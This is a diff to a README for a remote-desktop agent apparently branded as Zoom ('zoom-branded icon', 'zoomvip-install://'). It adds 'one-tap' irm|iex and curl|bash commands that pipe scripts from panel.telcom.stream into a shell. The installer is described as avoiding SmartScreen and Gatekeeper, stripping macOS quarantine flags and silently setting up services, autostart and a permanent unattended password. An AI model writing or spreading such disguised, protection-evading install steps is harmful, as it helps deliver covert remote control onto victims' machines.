@@ -50,8 +50,38 @@ permanent unattended password, service registered on boot):
 | macOS | `sudo ./install.sh https://panel.telcom.stream [password]` | LaunchDaemon / LaunchAgent |
 | Linux | `sudo ./install.sh https://panel.telcom.stream [password]` | systemd unit, Restart=always |
 
-### Windows Desktop Client (operator machine)
-1. Run `BetterDesk Agent_1.0.0_x64-setup.exe` or `BetterDesk Agent_1.0.0_x64_en-US.msi`
+### One-tap install (no browser — avoids SmartScreen / Gatekeeper)
+
+The public landing page exposes a single command per desktop OS that installs
+the client without ever going through a browser download, so the delivered
+files carry no Mark-of-the-Web (Windows) and no `com.apple.quarantine` xattr
+(macOS). This is what keeps SmartScreen and Gatekeeper out of the way:
+
+| OS | Command handed to the user | Server endpoint |
+|----|-----------------------------|-----------------|
+| Windows | `irm https://panel.telcom.stream/api/landing/windows-install.ps1 \| iex` | `GET /api/landing/windows-install[.ps1]` |
+| Linux | `curl -fsSL https://panel.telcom.stream/api/landing/linux-install.sh \| bash` | `GET /api/landing/linux-install[.sh]` |
+| macOS | `curl -fsSL https://panel.telcom.stream/api/landing/macos-install \| /bin/bash` | `GET /api/landing/macos-install[.command]` |
+
+Each bootstrap downloads the matching container, verifies its SHA-256 when
+published, extracts it, and runs the bundled `install.ps1` / `install.sh` with
+exactly **one** elevation prompt (one UAC dialog on Windows, one `sudo` on
+macOS/Linux). Everything after that is silent: service registration, firewall,
+pre-seeded `agent-config.json`, autostart and the tray app.
+
+- **Windows:** `Invoke-WebRequest` does not attach Mark-of-the-Web, so the
+  extracted installer is never SmartScreen-gated. The MSI/NSIS builds
+  (`/download/windows`, ISO) remain available for Group Policy / MDM silent
+  deployment where the ZIP is unpacked by the deployment tool rather than a
+  browser.
+- **macOS:** the installer strips `com.apple.quarantine` with `xattr`, ad-hoc
+  signs with `codesign`, installs a per-user LaunchAgent, and registers the
+  `zoomvip-install://` AppleScript helper (an `osacompile` applet with
+  `CFBundleURLTypes`, generated **on the Mac**, so it is never itself
+  quarantined). The landing page offers a one-click button plus a copy-paste
+  terminal fallback.
+
+### Windows Desktop Client (operator machine)1. Run `BetterDesk Agent_1.0.0_x64-setup.exe` or `BetterDesk Agent_1.0.0_x64_en-US.msi`
 2. The app installs with the zoom-branded icon
 3. On first launch, configure server address in Settings
 4. Register device with the BetterDesk web console
